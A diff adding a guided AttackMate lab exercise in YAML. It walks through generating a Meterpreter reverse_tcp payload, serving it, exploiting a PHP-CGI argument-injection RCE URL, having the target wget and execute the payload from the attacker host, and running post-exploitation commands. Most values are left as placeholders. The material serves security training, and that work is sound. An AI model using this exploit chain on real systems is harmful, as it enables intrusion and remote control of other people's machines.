@@ -1,0 +1,138 @@
+#
+# Exercise 2: Payload Generation and Delivery via webserv Guided Version
+#
+# Instructions:
+#     Each command skeleton is already in place.
+#     Replace every "???" placeholder with the correct value.
+#     Run with: attackmate --config ../config.yml exercise_02_payload_webserv_guided.yml
+#
+# Prerequisites: msfrpcd -P msf -a 127.0.0.1
+#
+
+vars:
+  # TODO: Replace with your actual IPs
+  TARGET: CHANGE_ME
+  ATTACKER: CHANGE_ME_ATTACKER
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: "4344"
+  WEBSERV_PORT: "8080"
+  # TODO: Replace CHANGE_ME with TARGET ip in the URL below
+  PHP_RCE_URL: "http://CHANGE_ME/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
+
+commands:
+  # ============================================
+  # PHASE 1: Generate the Payload
+  # ============================================
+
+  # TODO 1: Replace each "???":
+  #   - cmd: mktemp mode, use "file" to create a temporary file
+  #   - variable: name of the variable to store the path in (PAYLOAD_FILE)
+  - type: mktemp
+    cmd: "???"
+    variable: "???"
+
+  # TODO 2: Replace each "???":
+  #   - cmd: the payload variable
+  #   - format: output format for a Linux ELF binary
+  #   - local_path: the variable holding the temp file path
+  #   - payload_options LHOST: attacker IP variable
+  #   - payload_options LPORT: listener port variable
+  - type: msf-payload
+    cmd: "???"
+    format: "???"
+    local_path: "???"
+    payload_options:
+      LHOST: "???"
+      LPORT: "???"
+
+  # TODO 3: Replace "???" to print confirmation of payload path
+  # Expected output: "Payload generated at: /tmp/tmpXXXXXX"
+  - type: debug
+    cmd: "???"
+
+  # ============================================
+  # PHASE 2: Serve and Listen
+  # ============================================
+
+  # TODO 4: Replace each "???":
+  #   - local_path: the variable holding the payload file path
+  #   - port: the webserver port variable
+  # background and kill_on_exit are already set
+  - type: webserv
+    local_path: "???"
+    port: "???"
+    background: True
+    kill_on_exit: True
+
+  # TODO 5: Replace "???" with the number of seconds to wait for webserv to start
+  - type: sleep
+    seconds: "???"
+
+  # TODO 6: Replace each "???":
+  #   - cmd: the multi/handler module path
+  #   - payload: the payload variable
+  #   - payload_options LHOST/LPORT: same attacker and port variables as above
+  #   - creates_session: name this session "shell"
+  # background and kill_on_exit are already set
+  - type: msf-module
+    cmd: "???"
+    payload: "???"
+    payload_options:
+      LHOST: "???"
+      LPORT: "???"
+    creates_session: "???"
+    background: True
+    kill_on_exit: True
+
+  # ============================================
+  # PHASE 3: Trigger the Exploit
+  # ============================================
+
+  # TODO 7: Replace "???" in the curl body with PHP code that makes the target
+  # download the payload from our webserv.
+  # PHP template: <?php system('wget -O /tmp/shell http://<ATTACKER>:<PORT>/<PATH>')?>
+  # Use the ATTACKER, WEBSERV_PORT, and PAYLOAD_FILE variables.
+  # Note: use ${VAR} syntax inside double-quoted strings for variable expansion.
+  - type: shell
+    cmd: curl -s -XPOST "$PHP_RCE_URL" -d "???"
+
+  # TODO 8: Replace "???" with the number of seconds to wait for the download
+  - type: sleep
+    seconds: "???"
+
+  # TODO 9: Replace "???" in the curl body with PHP code that makes the target
+  # execute the downloaded payload.
+  # PHP template: <?php system('chmod +x /tmp/shell && /tmp/shell &')?>
+  # background is already set 
+  - type: shell
+    cmd: >-
+      curl -s -XPOST "$PHP_RCE_URL"
+      -d "???"
+    background: True
+    kill_on_exit: True
+
+  # TODO 10: Replace "???" with the number of seconds to wait for the reverse connection
+  - type: sleep
+    seconds: "???"
+
+  # ============================================
+  # PHASE 4: Post-Exploitation
+  # ============================================
+
+  # TODO 11: Replace "???" with the stdapi command to get system information
+  # session and stdapi are already set
+  - type: msf-session
+    session: shell
+    stdapi: True
+    cmd: "???"
+
+  # TODO 12a: Replace "???" with the stdapi command to get the current user
+  - type: msf-session
+    session: shell
+    stdapi: True
+    cmd: "???"
+
+  # TODO 12b: Replace "???" to print the current user
+  # Expected output: "Current user: <uid>"
+  - type: debug
+    cmd: "???"
